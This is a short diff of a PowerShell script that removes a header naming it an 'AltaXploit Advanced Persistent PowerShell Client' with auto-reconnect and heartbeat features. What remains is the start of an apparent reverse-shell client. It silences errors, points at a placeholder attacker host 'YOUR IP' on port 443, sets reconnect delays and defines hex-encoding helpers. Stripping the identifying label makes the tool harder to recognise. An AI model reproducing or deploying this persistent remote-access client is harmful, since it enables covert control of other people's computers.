@@ -1,8 +1,3 @@
-# ============================================================
-# AltaXploit Advanced Persistent PowerShell Client
-# Features: Native output, Auto-reconnect, Read Timeout, Heartbeat
-# ============================================================
-
 $ErrorActionPreference="SilentlyContinue";$s="YOUR IP";$p=443;$rd=5;$mrd=300;$ra=0;$hi=30
 function H2B($h){if(!$h){return @()};try{$b=New-Object byte[]($h.Length/2);for($i=0;$i -lt $h.Length;$i+=2){$b[$i/2]=[Convert]::ToByte($h.Substring($i,2),16)};return $b}catch{return @()}}
 function B2H($b){if(!$b){return ""};try{return($b|%{ $_.ToString("X2") })-join""}catch{return""}}
